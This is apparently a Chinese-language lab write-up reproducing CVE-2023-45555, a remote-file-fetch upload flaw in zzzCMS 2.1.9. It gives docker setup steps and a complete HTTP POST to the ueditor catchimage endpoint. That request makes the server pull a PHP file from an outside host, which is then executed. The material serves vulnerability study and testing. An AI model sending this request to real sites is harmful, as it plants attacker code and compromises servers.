# CVE-2023-45555 zzzcms 抓取远程文件shell上传

 zzzcms系统是一款免费、开源的php语言建站系统，采用类MVC结构，框架简单，简单易学。诞生于2016年，其设计初衷是为了让用户快速、方便地建立自己的网站。该系统采用PHP语言开发，支持多相对于其他内容管理系统，ZZZCMS的特点在于其操作简单，易于上手，而且具有良好的扩展性和安全性。此外，ZZZCMS还提供了丰富的功能模块，包括文章管理、分类管理、标签管理、留言管理、友情链接管理等，可以满足大多数用户的需求。同时，ZZZCMS还提供了强大的SEO优化功能，可以帮助用户提高网站的排名，吸引更多的流量。支持MySQL、sQLite数据库。

 zzzCMS v.2.1.9 中的文件上传漏洞允许远程攻击者通过将 imageext 参数从 jpg、jpeg、gif 和 png 修改为 jpg、jpeg、gif、png、pphphp 来执行任意代码。

zzzCMS官网 http://www.zzzcms.com/index.html

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2023-45555
- https://github.com/96xiaopang/Vulnerabilities/blob/main/zzzcms任意文件上传_en.md

## 漏洞环境



执行如下命令启动一个zzzcms-v2.1.7-web：

```
docker compose up -d
```



环境启动后，访问`http://your-ip:80`即可跳转到zzzcmsan安装向导页面



## 漏洞复现

1，使用CVE-2023-45554 增加图片上传的类型 php

![](https://github.com/Shelter1234/VulneraLab/raw/main/zzzCMS/CVE-2023-45554/4.png)

2，构造如下包，抓取远程文件

```
POST /plugins/ueditor/php/controller.php?action=catchimage&encode=utf-8 HTTP/1.1
Host: www.zzcms.io
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cookie: _ga=GA1.1.2049876865.1708327587; _ga_ZCZHJPMEG7=GS1.1.1709204007.4.0.1709204007.0.0.0; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1709286898; wp-settings-time-1=1709712213; __test=1; PUBLICCMS_ANALYTICS_ID=3a91f834-b96d-451b-a953-6739bcff6ca0; PUBLICCMS_ADMIN=1_27f0e838-371b-4207-b689-7078a11597be; PHPSESSID=feab404c462e213c6ee39963cc6f7178; zzz998_usercheck=0; zzz116_token=bdcc0f20eec1a5aa7b0a97a58248dacc; zzz116_adminpass=1; zzz116_adminpath=1; zzz116_adminname=admin; zzz116_admintime=1712735964; zzz116_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz911_token=10a5ec35885be8a4f58414fc7b4deeb0; zzz911_adminpass=1; zzz911_adminpath=1; zzz911_adminname=admin; zzz911_admintime=1712739306; zzz911_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz436_adminpass=1; zzz436_adminpath=1; zzz436_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz811_upload=[{"url":"/upload/news/20220923025718/1663916253122919.jpg","title":1663916253122919}]; zzz436_token=7fdaa1daaeb4cd0cbc5c70dcb010c18d; zzz436_adminname=admin; zzz436_admintime=1712831317
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

source[]=http://10.66.64.89/phpinfo.php
```

![image-20240411184608861](./1.png)

3，访问我们构造好的php文件

![image-20240411185945276](./2.png)